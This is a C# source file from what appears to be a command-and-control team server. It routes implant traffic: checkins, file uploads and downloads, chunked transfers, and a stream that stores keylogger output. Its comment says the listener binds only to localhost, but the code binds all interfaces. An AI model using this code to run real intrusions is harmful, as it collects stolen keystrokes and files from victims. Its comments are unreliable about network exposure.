//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using System.Net;
using TeamServer.Interface;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Modules;
using Trinity.Shared.Results;
namespace TeamServer.Services.Factories
{
    public class HttpModuleFactory : IHttpModuleFactory
    {
        private readonly ILoggerFactory _loggerFactory;
        private readonly IServiceScopeFactory _scopeFactory;

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Initializes a new instance of HttpModuleFactory using the specified logger factory.
        /// </summary>
        /// <param name="loggerFactory">The logger factory used to create loggers for components produced by the factory.</param>
        /// <exception cref="ArgumentNullException">Thrown when <paramref name="loggerFactory"/> is <c>null</c>.</exception>
        public HttpModuleFactory(ILoggerFactory loggerFactory, IServiceScopeFactory scopeFactory)
        {
            _loggerFactory = loggerFactory ?? throw new ArgumentNullException(nameof(loggerFactory));
            _scopeFactory = scopeFactory ?? throw new ArgumentNullException(nameof(scopeFactory));
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Creates and starts an HttpModule that listens on http://localhost:{port}/.
        /// </summary>
        /// <remarks>The caller is responsible for disposing the returned HttpModule to stop and release
        /// the underlying HttpListener. Binding can fail if the port is in use or requires elevated privileges; only
        /// the localhost address is registered.</remarks>
        /// <param name="port">TCP port number to bind the HttpListener to.</param>
        /// <exception cref="HttpListenerException>"/>
        /// <returns>An HttpModule with a started HttpListener bound to localhost and the specified port.</returns>
        public HttpModule Create(int port)
        {
            HttpListener httpListener = new HttpListener();
            httpListener.Prefixes.Add($"http://+:{port}/");
            httpListener.Start();

            return new HttpModule(
                _loggerFactory.CreateLogger<HttpModule>(),
                httpListener,
                ForwardCheckinAsync,
                ForwardFileUploadAsync,
                ForwardFileDownloadAsync,
                ForwardChunkUploadAsync,
                ForwardRebuildAsync,
                ForwardStreamDataAsync
            );
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Forwards an agent checkin blob to the scoped <see cref="IAgentService"/> and returns its response.
        /// </summary>
        private async Task<Result<string>> ForwardCheckinAsync(string blob, int sleepMs, int jitter)
        {
            using var scope = _scopeFactory.CreateScope();
            var agentService = scope.ServiceProvider.GetRequiredService<IAgentService>();
            return await agentService.Checkin(blob, sleepMs, jitter);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Stores a file the agent uploaded over the listener port.
        /// </summary>
        private async Task ForwardFileUploadAsync(
            string agentKey,
            string fileName,
            Stream body,
            CancellationToken cancellationToken
        )
        {
            using var scope = _scopeFactory.CreateScope();
            var fileTransferService = scope.ServiceProvider.GetRequiredService<IFileTransferService>();
            await fileTransferService.ReceiveFileAsync(agentKey, fileName, body, cancellationToken);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Streams a stored file back to the agent over the listener port.
        /// </summary>
        /// <returns><c>true</c> when the file existed and was copied; otherwise <c>false</c>.</returns>
        private async Task<bool> ForwardFileDownloadAsync(
            int campaignId,
            string fileName,
            Stream destination,
            CancellationToken cancellationToken
        )
        {
            using var scope = _scopeFactory.CreateScope();
            var receivedFileService = scope.ServiceProvider.GetRequiredService<IReceivedFileService>();

            await using FileStream? file = await receivedFileService.OpenFileAsync(campaignId, fileName);
            if (file is null)
            {
                return false;
            }

            await file.CopyToAsync(destination, cancellationToken);
            return true;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Stores one chunk of a large upload the agent streams over the listener port.
        /// </summary>
        private async Task ForwardChunkUploadAsync(
            string agentKey,
            string transferId,
            int chunkNumber,
            Stream body,
            CancellationToken cancellationToken
        )
        {
            using var scope = _scopeFactory.CreateScope();
            var fileTransferService = scope.ServiceProvider.GetRequiredService<IFileTransferService>();
            await fileTransferService.ReceiveChunkAsync(agentKey, transferId, chunkNumber, body, cancellationToken);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Joins the chunks of a finished upload and returns the rebuilt path.
        /// </summary>
        private async Task<string> ForwardRebuildAsync(string agentKey, string transferId, CancellationToken cancellationToken)
        {
            using var scope = _scopeFactory.CreateScope();
            var fileTransferService = scope.ServiceProvider.GetRequiredService<IFileTransferService>();
            return await fileTransferService.RebuildFileAsync(agentKey, transferId, cancellationToken);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Appends one piece of continuous data (the keylogger's harvest) to a server-side stream.
        /// </summary>
        private async Task ForwardStreamDataAsync(
            string agentKey,
            string streamId,
            Stream body,
            CancellationToken cancellationToken
        )
        {
            using var scope = _scopeFactory.CreateScope();
            var fileTransferService = scope.ServiceProvider.GetRequiredService<IFileTransferService>();
            await fileTransferService.ReceiveStreamDataAsync(agentKey, streamId, body, cancellationToken);
        }

    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//